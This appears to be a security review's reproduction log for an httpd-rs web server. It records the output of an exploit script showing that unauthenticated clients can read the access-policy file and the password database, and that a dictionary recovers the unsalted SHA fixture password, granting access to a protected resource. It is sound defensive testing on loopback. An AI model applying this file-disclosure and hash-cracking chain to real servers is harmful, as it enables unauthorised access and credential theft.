@@ -1,0 +1,26 @@
+Pass 39 retained local reproduction
+Date: 2026-11-13 UTC
+Reviewed commit: 37f9f3f3df11a21e1f0f0613d89d5d5ecaf86b6f
+Binary: target/release/httpd-rs rebuilt from the clean reviewed commit
+Command: python3 adversarial/p39/exploit_p39.py
+
+binary=/workspace/vapache/target/release/httpd-rs
+public_control=200 body=b'P39 public control\n'
+access_file=200 body=b'RewriteEngine On\nRewriteRule ^legacy$ /index.html [R=302,L]\nHeader set X-P39-Policy P39-ACCESS-POLICY-SECRET-7b21\n'
+auth_file=200 body=b'alice:{SHA}5en6G6MezRroT3XKqkdPOmY/BfQ=\n'
+protected_without_auth=401
+dictionary_recovered_password='secret'
+protected_with_recovered_auth=200 body=b'P39-PROTECTED-RESOURCE-7b21\n'
+RESULT: VULNERABLE — configured administrative inputs reached StaticFile
+
+Interpretation:
+
+- The access file is active policy (its Header directive affects the public
+  control response), yet an unauthenticated request can read the complete file.
+- The password database is the exact AuthUserFile protecting secret.txt, yet
+  an unauthenticated request can read the complete database.
+- The protected resource is not otherwise public: the no-credential control is
+  401.  A four-entry offline dictionary recovers the deliberately project-style
+  unsalted {SHA} fixture credential, after which the same remote client gets the
+  protected marker with status 200.
+- No product source was modified.  All traffic was loopback-only.
